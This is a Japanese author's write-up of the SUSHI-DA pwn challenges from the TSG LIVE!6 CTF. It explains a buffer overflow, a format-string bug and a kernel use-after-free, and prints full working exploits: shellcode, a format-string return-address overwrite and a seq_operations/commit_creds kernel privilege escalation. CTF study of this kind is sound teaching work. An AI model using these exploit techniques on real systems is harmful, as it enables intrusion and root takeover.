keywords
BOF, FSA, 
# イントロ
いつぞや開催された`TSG LIVE!6 CTF`。120分という超短期間のCTF。pwnを作ったのでその振り返りとliveの感想。
![](https://i.imgur.com/1FFfUzz.png)


# 問題概要
Level 1~3で構成される問題。どのレベルもLKMを利用したプログラムを共通して使っているが、Lv1/2はLKMを使わなくても(つまり、QEMU上で走らせなくても)解けるようになっている。
短期間CTFであり、プレイヤの画面が公開されるという性質上、放送映えするような問題にしたかった。pwnの楽しいところはステップを踏んでexploitしていくところだと思っているため、Level順にプログラムのロジックバイパス・user shellの奪取・root shellの奪取という流れになっている。正直Level3は特定の人物を狙い撃ちした問題であり、早解きしてギリギリ120分でいけるかなぁ(願望)という難易度になっている。

# SUSHI-DA1: logic bypass
```static.sh
$ file ./client
./client: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=982caef5973f267fa669d3922c57233063f709d2, for GNU/Linux 3.2.0, not stripped
$ checksec --file ./client
[*] '/home/wataru/test/sandbox/client'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

冷え防止の問題。テーマは寿司打というタイピングゲーム。
```client.c
  struct {
    unsigned long start, result;
    char type[MAX_LENGTH + 0x20];
    int pro;
  } info = {0};
 (snipped...)
  info.result = time(NULL) - info.start;
  puts("\n[ENTER] again to finish!");
  readn(info.type, 0x200);

  printf("\n🎉🎉🎉Congrats! You typed in %lu secs!🎉🎉🎉\n", info.result);
  register_record(info.result);
  if(info.pro != 0) system("cat flag1");
```

クリアした後にENTERを受け付ける箇所があるが、ここでバッファサイズの200+の代わりに0x200を受け付けてしまっているため`struct info`内でBOFが発生し`info.pro`を書き換えられる。

# SUSHI-DA2: user shell
```client.c
  while(success < 3){
    unsigned question = rand() % 4;
    if(wordlist[question][0] == '\x00') continue;
    printf("[TYPE]\n");
    printf(wordlist[question]); puts("");
    readn(info.type, 200);
    if(strncmp(wordlist[question], info.type, strlen(wordlist[question])) != 0)  warn_ret("🙅‍🙅 ACCURACY SHOULD BE MORE IMPORTANT THAN SPEED.");
    ++success;
  }
(snipped...)
void add_phrase(void){
  char *buf = malloc(MAX_LENGTH + 0x20);
  printf("[NEW PHRASE] ");
  readn(buf, MAX_LENGTH - 1);
  for(int ix=0; ix!=MAX_LENGTH-1; ++ix){
    if(buf[ix] == '\xa') break;
    memcpy(wordlist[3]+ix, buf+ix, 1);
  }
}
```

タイピングのお題を1つだけカスタムできるが、お題の表示にFSBがある。これでstackのleakができる。
この後の方針は大きく分けて2つある。1つ目は、stackがRWXになっているためstackにshellcodeを積んだ上でRAをFSBで書き換えてshellを取る方法。この場合、FSAの入力と発火するポイントが異なるため、FSAで必要な準備(書き換え対象のRAがあるアドレスをstackに積む必要がある)はmain関数のstackに積んでおくことになる。また、発火に時間差があるという都合上、単純にpwntoolsを使うだけでは解くことができない。
```client.c
int main(int argc, char *argv[]){
  char buf[0x100];
  srand(time(NULL));
  setup();

  while(1==1){
    printf("\n\n$ ");
    if (readn(buf, 100) <= 0) die("[ERROR] readn");
```
2つ目は、canaryだけリークしてあとは通常のBOFでROPするという方法。こっちのほうが多分楽。正直、canaryはleakできない感じの設定にしても良かった(bufサイズを調整)が、200と0x200を打ち間違えたという雰囲気を出したかった都合上、canaryのleak+ROPまでできるくらいの設定になった。

# SUSHI-DA3: root shell
ここまででuser shellがとれているため、今度はLKMのバグをついてrootをとる。バグは以下。
```sushi-da.c
long clear_old_records(void)
{
  int ix;
  char tmp[5] = {0};
  long date;
  for(ix=0; ix!=SUSHI_RECORD_MAX; ++ix){
    if(records[ix] == NULL) continue;
    strncpy(tmp, records[ix]->date, 4);
    if(kstrtol(tmp, 10, &date) != 0 || date <= 1990) kfree(records[ix]);
  }
  return 0;
}
```
タイピングゲームの記録をLKMを使って記録しているのだが、古いレコード(1990年以前)と不正なレコードを削除する関数においてkfreeしたあとの値をクリアしていない。これによりkUAFが生じる。
SMEP/SMAP無効KAISER無効であるため、あとは割と任意のことができる。editがないことやkmallocではなくkzallocが使われているのがちょっと嫌な気もするが、実際はdouble freeもあるため`seq_operations`でleakしたあとに再びそれをrecordとして利用することでRIPを取ることができる。

# full exploit
```exploit.py
#!/usr/bin/python2
# -*- coding: utf-8 -*-

# coding: 4 spaces

# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
import pwnlib
import sys, os

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

hosts = ("sushida.pwn.hakatashi.com","localhost","localhost")
ports = (1337,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
#binf = ELF(FILENAME)
#libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge(command):
  global c
  c.recvuntil("$ ")
  c.sendline(command)

def typin():
  c.recvuntil("[TYPE]")
  c.recvline()
  c.sendline(c.recvline().rstrip())

def play_clear(avoid_nirugiri=True):
  global c
  hoge("play")
  for _ in range(3):
    typin()
  
def custom(phrase):
  global c
  hoge("custom")
  c.recvuntil("[NEW PHRASE] ")
  c.sendline(phrase)

def custom_wait_NIRUGIRI(pay, append_nirugiri=True):
  global c
  print("[.] waiting luck...")
  res = ""
  found = False
  if append_nirugiri:
    custom("NIRUGIRI" + pay)
  else:
    custom(pay)

  while True:
    hoge("play")
    for _ in range(3):
      c.recvuntil("[TYPE]")
      c.recvline()
      msg = c.recvline().rstrip()
      if "NIRUGIRI" in msg:
        found = True
        res = msg
        if append_nirugiri:
          c.sendline("NIRUGIRI"+pay)
        else:
          c.sendline(pay)
      else:
        c.sendline(msg)
    c.recvuntil("ENTER")
    c.sendline("")
    if found:
      break      
  
  return res[len("NIRUGIRI"):]

def inject_wait_NIRUGIRI(pay):
  global c
  print "[.] injecting and waiting luck",
  res = ""
  found = False
  aborted = False
  custom(pay)

  while True:
    hoge("play")
    for _ in range(3):
      c.recvuntil("[TYPE]")
      c.recvline()
      msg = c.recvline().rstrip()
      if "NIRUGIRI" in msg:
        print("\n[!] FOUND")
        c.sendline("hey")
        return
      else:
        print ".",
        c.sendline(msg)
    if aborted:
      aborted = False
      continue
    c.sendline("")

## exploit ###########################################

def exploit():
  global c
  global kctf
  MAX_TYPE = 200

  ##############################
  #  LEVEL 1                   #
  ##############################
  # overwrite info.pro
  play_clear()
  c.recvuntil("ENTER")
  c.sendline("A"*0xf8)
  c.recvuntil("typed")
  c.recvline()
  flag1 = c.recvline().rstrip()
  if "TSGLIVE" not in flag1:
      exit(1)
  print("\n[!] Got a flag1 🎉🎉🎉 " + flag1)

  ###############################
  ##  LEVEL 2                   #
  ###############################
  SC_START = 0x50
  pay = b""

  # leak stack
  pay += "%42$p"
  leaked = int(custom_wait_NIRUGIRI(pay), 16)
  ra_play_game = leaked - 0x128
  buf_top = leaked - 0x230
  target_addr = ra_play_game + 0x38
  print("[+] leaked stack: " + hex(leaked))
  print("[+] ra_play_game: " + hex(ra_play_game))
  print("[+] buf_top: " + hex(buf_top))
  pay_index = 47

  # calc
  v0 = target_addr & 0xFFFF
  v1 = (target_addr >> 16) & 0xFFFF
  v2 = (target_addr >> 32) & 0xFFFF
  assert(v0>8 and v1>8 and v2>8)
  vs = sorted([[0,v0],[1,v1],[2,v2]], key= lambda l: l[1])

  # place addr & sc
  sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
  c.recvuntil("$ ")
  pay = b""
  pay += "A"*8
  pay += p64(ra_play_game) + p64(ra_play_game+2) + p64(ra_play_game+4)
  pay += sc
  assert(len(pay) <= 0x50)
  assert("\x0a" not in pay)
  c.sendline(pay)

  # overwrite return-addr with FSA
  pay = b""
  pay += "NIRUGIRI"
  pay += "%{}c".format(vs[0][1]-8)
  pay += "%{}$hn".format(pay_index + vs[0][0])
  pay += "%{}c".format(vs[1][1] - vs[0][1])
  pay += "%{}$hn".format(pay_index + vs[1][0])
  pay += "%{}c".format(vs[2][1] - vs[1][1])
  pay += "%{}$hn".format(pay_index + vs[2][0])
  assert("\x0a" not in pay)
  assert(len(pay) < MAX_TYPE)
  print("[+] shellcode placed @ " + hex(target_addr))

  # nirugiri
  inject_wait_NIRUGIRI(pay) # if NIRUGIRI comes first, it fails
  c.sendlineafter("/home/user $", "cat ./flag2")
  flag2 = c.recvline()
  if "TSGLIVE" not in flag2:
      exit(2)
  print("\n[!] Got a flag2 🎉🎉🎉 " + flag2)

  ##############################
  #  LEVEL 3                   #
  ##############################
  # pwning kernel...
  c.recvuntil("/home/user")
  print("[!] pwning kernel...")
  if kctf:
    with open("/home/user/exploit.gz.b64", 'r') as f:
      binary = f.read()
  else:
    with open("./exploit.gz.b64", 'r') as f:
      binary = f.read()

  progress = 0
  pp = 0
  N = 0x300
  total = len(binary)
  print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
  for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
    c.sendlineafter('$', 'echo -n "{}" >> exploit.gz.b64'.format(s)) # don't forget -n
    progress += N
    if (float(progress) / float(total)) > pp:
      pp += 0.1
      print("[.] sent {} bytes [{} %]".format(hex(progress), float(progress)*100.0/float(total)))
  c.sendlineafter('$', 'base64 -d exploit.gz.b64 > exploit.gz')
  c.sendlineafter('$', 'gunzip ./exploit.gz')

  c.sendlineafter('$', 'chmod +x ./exploit')
  c.sendlineafter('$', '/home/user/exploit')

  c.recvuntil("# ")
  c.sendline("cat flag3")
  flag3 = c.recvline()
  if "TSGLIVE" not in flag3:
      exit(3)
  print("\n[!] Got a flag3 🎉🎉🎉 " + flag3)


## main ##############################################

if __name__ == "__main__":
    global c
    global kctf
    kctf = False
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
      elif sys.argv[1][0]=="k":
        c = remote("127.0.0.1", 1337) # kctf XXX
        kctf = True
        print("[+] kctf healthcheck mode")
        print(c.recvuntil("== proof-of-work: "))
        if c.recvline().startswith(b'enabled'):
          handle_pow(c)
    else:
        c = remote(rhp2['host'],rhp2['port'])

    try:
        exploit()
    except:
        print("\n")
        print(sys.exc_info()[0], sys.exc_info()[1])
        print("\n[?] exploit failed... try again...")
        exit(4)
    if kctf:
        print("\n[+] healthcheck success!")
        exit(0)
    else:
        c.interactive()
```

kernel.
```exploit.c
#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <linux/prctl.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/shm.h>

#include "../include/sushi-da.h"


// commands
#define DEV_PATH "/dev/sushi-da"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)


// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define NULL (void*)0
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) errExit("KMALLOC");}
ulong user_cs,user_ss,user_sp,user_rflags;
struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
  ulong sp; ulong ss;
};
void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}
void NIRUGIRI(void)
{
  puts("[!] NIRUGIRI!");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("\n\n Got a root! 🎉🎉🎉");
  execve("/bin/sh",argv,envp);
}

// should compile with -masm=intel
static void save_state(void) {
  asm(
      "movq %0, %%cs\n"
      "movq %1, %%ss\n"
      "movq %2, %%rsp\n"
      "pushfq\n"
      "popq %3\n"
      : "=r" (user_cs), "=r" (user_ss), "=r"(user_sp), "=r" (user_rflags) : : "memory" 		);
}

ulong kernbase;
ulong commit_creds, prepare_kernel_cred;

static void shellcode(void){
  ulong init_cred;
  asm(
    "mov %%rdi, 0x0\n"
    "call %P1\n"
    "movq %0, %%rax"
    : "=r" (init_cred) : "r" ((void*)prepare_kernel_cred) : "memory"
  );
  asm(
      "mov %%rdi, %0\n"
      "call %P1\n" 
      ::"r"((void *)init_cred), "r"((void *)commit_creds) : "memory"
  );
  asm(
      "swapgs\n"
      "mov %%rax, %0\n"
      "push %%rax\n"
      "mov %%rax, %1\n"
      "push %%rax\n"
      "mov %%rax, %2\n"
      "push %%rax\n"
      "mov %%rax, %3\n"
      "push %%rax\n"
      "mov %%rax, %4\n"
      "push %%rax\n"
      "iretq\n" 
      ::"r"(user_ss), "r"(user_sp), "r"(user_rflags), "r"(user_cs), "r"(&NIRUGIRI) : "memory"
    );
}
// (END utils)

void register_record(int fd, int score, char *date){
  struct ioctl_register_query  q = {
    .record = {.result = score,},
  };
  strncpy(q.record.date, date, 0x10);
  if(ioctl(fd, SUSHI_REGISTER_RECORD, &q) < 0){
    errExit("register_record()");
  } 
}

void fetch_record(int fd, int rank, struct record *record){
  struct ioctl_fetch_query q = {
    .rank = rank,
  };
  if(ioctl(fd, SUSHI_FETCH_RECORD, &q) < 0){
    errExit("fetch_record()");
  } 
  memcpy(record, &q.record, sizeof(struct record));
}

void clear_record(int fd){
  if(ioctl(fd, SUSHI_CLEAR_OLD_RECORD, NULL) < 0){
    errExit("clear_record()");
  } 
}

void show_rankings(int fd){
  struct ioctl_fetch_query q;
  for (int ix = 0; ix != 3; ++ix){
    q.rank = ix + 1;
    if (ioctl(fd, SUSHI_FETCH_RECORD, &q) < 0) break;
    printf("%d: %ld sec : %s\n", ix + 1, q.record.result, q.record.date);
  }
}

void clear_all_records(int fd){
  if(ioctl(fd, SUSHI_CLEAR_ALL_RECORD, NULL) < 0){
    errExit("clear_all_records()");
  }
}

int main(int argc, char *argv[]) {
  char inbuf[0x200];
  char outbuf[0x200];
  int seqfd;
  int tmpfd[0x90];
  memset(inbuf, 0, 0x200);
  memset(outbuf, 0, 0x200);
  printf("[.] pid: %d\n", getpid());
  printf("[.] NIRUGIRI at %p\n", &NIRUGIRI);
  printf("[.] shellcode at %p\n", &shellcode);
  int fd = open(DEV_PATH, O_RDWR);
  if(fd <= 2){
    perror("[ERROR] failed to open mora");
    exit(0);
  }
  clear_all_records(fd);

  struct record r;
  struct record r1 = {
    .result = 1,
    .date = "1930/03/12",
  };

  // heap spray
  puts("[.] heap spraying...");
  for (int ix = 0; ix != 0x90; ++ix)
  {
    tmpfd[ix] = open("/proc/self/stat", O_RDONLY);
  }

  // leak kernbase
  puts("[.] generating kUAF...");
  register_record(fd, r1.result, r1.date);
  clear_record(fd);
  if((seqfd = open("/proc/self/stat", O_RDONLY)) <= 0){
    errExit("open seq_operations");
  }
  fetch_record(fd, 1, &r);

  const ulong _single_start = *((long*)r.date);
  const ulong kernbase = _single_start - 0x194090;
  printf("[+] single_start: %lx\n", _single_start);
  printf("[+] kernbase: %lx\n", kernbase);
  commit_creds = kernbase + 0x06cd00;
  printf("[!] commit_creds: %lx\n", commit_creds);
  prepare_kernel_cred = kernbase + 0x6d110;
  printf("[!] prepare_kernel_cred: %lx\n", prepare_kernel_cred);

  // double free
  struct record r2 = {
    .result = 3,
  };
  *((ulong*)r2.date) = &shellcode;
  clear_record(fd);
  register_record(fd, r2.result, r2.date);

  // get RIP
  save_state();
  for (int ix = 0; ix != 0x80; ++ix){
    close(tmpfd[0x90 - 1 - ix]);
  }
  read(seqfd, inbuf, 0x10);

  return 0;
}
```

Makefile
```Makefile
# exploit
$(EXP)/exploit: $(EXP)/exploit.c
	docker run -it --rm -v "$$PWD:$$PWD" -w "$$PWD" alpine /bin/sh -c 'apk add gcc musl-dev linux-headers && $(CC) $(CPPFLAGS) $<'
	#$(CC) $(CPPFLAGS) $<
	strip $@

.INTERMEDIATE: $(EXP)/exploit.gz
$(EXP)/exploit.gz: $(EXP)/exploit
	gzip $<
$(EXP)/exploit.gz.b64: $(EXP)/exploit.gz
	base64 $< > $@
exp: $(EXP)/exploit.gz.b64
```

# 感想
まずは、参加してくださった方々、とりわけ外部ゲストの方々ありがとうございました。超強豪が問題を解いている画面を見れるなんて滅多にないので、裏でかなり興奮していました。
特にpwnyaa[@pwnyaa]さんが残り3分くらいでroot shellを取ったところは感動モノでした。wgetを入れていなかったことや、サーバが本当の最後の数分間に調子が悪かったらしいこともあって足を引っ張ってしまって申し訳ないです。。。

今回の作問は、ステップを登っていく楽しさは味わえるようにしながら、ライブなので冷えすぎないように調整することが大事だったと思います。最初はそのコンセプトのもとにプログラムも80-90行くらいで収まるようにしていたのですが、あまりにも意味のないプログラムになりすぎたのでボツにして寿司打にしました(最初はcowsayをもじったmorasayという問題でした)。その結果として100行を超えてしまったのですが、個人的に少し長いプログラムよりもなにをしているかわからないプログラムのほうが読むの苦手なので寿司打におちつきました(それでもレコードをLKMに保存するの、意味わからんけど)。難易度に関しては、Lv1/2はライブ用にしましたが、Lv3は外部用の挑戦問題にしました。ただ、userland側のコードの多さゆえにミスリードが何箇所か存在していたらしく、それのせいで数分奪われてしまい解ききれないという人もいたと思うので、やっぱりシンプルさは大事だなぁと反省しました。

今回のpwnに関しては、kCTFでデプロイしています。ただ、k8sよくわからんので、実際に運用しているときにトラブルが発生して迅速に対応できるかと言うと、僕の場合はNoです。また、kCTFにはhealthcheckを自動化してくれるフレームワークが有るためexploitをhealthcheckできるような形式で書いたりする必要があります(今回はそんなに手間ではありませんでしたが、上のexploitコードの1/3くらいは冗長だと思います)。今回もhealthcheckは走ってたらしいですが、なにせstatusバッジがないためあんまり意味があったかはわかりません。
余談ですが、kCTFで権限を落とすのに使われているsetprivですが、aptリポジトリのsetprivを最新のkernelで使うことはできません。というのも、古いsetprivは`/proc/sys/kernel/cap_last_cap`から入手したcap数と`linux/include`内で定義されているcap数を比べてassertしているようなので。
```a.sh
wataru@skbpc:~/test/sandbox/ctf-directory/chal-sample: 15:41:59 Wed May 05
$ cat /proc/sys/kernel/cap_last_cap
39
wataru@skbpc:~/test/sandbox/ctf-directory/chal-sample: 15:42:11 Wed May 05
$ cat /usr/include/linux/capability.h | grep CAP_LAST_CAP -B5
/* Allow reading the audit log via multicast netlink socket */
#define CAP_AUDIT_READ          37
#define CAP_LAST_CAP         CAP_AUDIT_READ
```
最新のkernelではCAP_BPFとCAP_PERFMONが追加されているため差分が生じてassertに失敗してしまいます。最新のsetprivでは`cap_last_cap`を全面的に信用することにしたらしいので、大丈夫なようです。
```a.c
			/* We can trust the return value from cap_last_cap(),
			 * so use that directly. */
			for (i = 0; i <= cap_last_cap(); i++)
				cap_update(action, type, i);
```
実際にデプロイするときはkernelのver的に大丈夫でしたが、localで試すときには最新版のsetprivをソースからビルドして使いました。



あと毎回思うんですが、pwnの読み方はぽうんではなくぱうんだと思います。




まぁなにはともあれlive-ctfも終わりです。


# 参考
TSG LIVE!6
https://www.youtube.com/watch?v=oitn3AiP6bM&t=14898s
ニルギリ
https://youtu.be/yvUvamhYPHw
